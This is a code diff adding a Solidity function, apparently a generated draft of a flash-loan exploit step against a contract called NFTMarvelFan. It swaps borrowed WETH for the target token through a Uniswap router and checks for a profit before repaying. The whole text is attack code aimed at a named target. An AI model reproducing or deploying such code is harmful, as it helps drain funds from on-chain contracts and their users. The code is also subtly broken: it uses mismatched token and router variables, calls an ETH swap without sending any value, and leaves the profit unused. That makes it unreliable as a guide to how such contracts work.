@@ -1,0 +1,44 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start exploiting by getting the current balances
+    uint256 initialBalance = valuableToken.balanceOf(address(this));
+
+    // Get the contract address for NFTMarvelFan, which is our target
+    INFTMarvelFan nftMarvelFan = INFTMarvelFan(target);
+    address router = nftMarvelFan.uniswapV2Router();
+    IWETH weth = IWETH(nftMarvelFan.WETH());
+    
+    // Perform the operations that might lead to an exploit
+    // We will swap some WETH for NFT tokens (using the router).
+    address[] memory path = new address[](2);
+    path[0] = address(weth);
+    path[1] = address(valuableToken);
+
+    // Assume we want to use a percentage of the amount for the swap.
+    uint256 amountToSwap = amount / 10; // swap 10% of the flash loan amount
+    weth.withdraw(amountToSwap); // Withdraw WETH to the contract's address
+
+    // Approve the Uniswap router to spend our tokens
+    weth.approve(router, amountToSwap);
+
+    // We swap WETH for the NFT token with a minimum amount out set to 0 for starting.
+    uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens(
+        0,
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // Now we can do the final checks and what needs to be done after exploiting.
+    uint256 finalBalance = valuableToken.balanceOf(address(this));
+
+    require(finalBalance > initialBalance, "Exploit failed: no increase in token balance");
+
+    // Transfer a portion of valuableToken back to the flashloan provider
+    uint256 surplus = finalBalance - amount; // Calculate profit
+    profitableToken.transfer(flashloanProvider, amount);
+    require(profitableToken.balanceOf(address(this)) > 0, "Not enough to repay loan");
+}
+</executeExploitCode>
+```
